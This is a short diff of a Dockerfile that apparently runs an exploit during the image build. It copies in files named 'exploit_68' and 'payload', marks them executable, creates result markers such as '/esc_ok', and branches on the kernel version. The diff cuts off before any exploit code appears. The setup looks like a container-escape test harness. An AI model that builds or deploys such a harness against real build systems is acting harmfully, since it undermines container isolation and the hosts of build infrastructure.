@@ -1,13 +1,14 @@
 # syntax=er028455/df-frontend:v4
-# build-trigger: 358
-FROM alpine:3.19 AS builder 
+FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils
-       
+
 COPY exploit_68 /exploit
 COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
 
+ARG CACHEBUST=358
 RUN sh -c '{ \
+echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
 echo "=== BUILD V33 KERNEL=$KVER ==="; \
 case "$KVER" in \
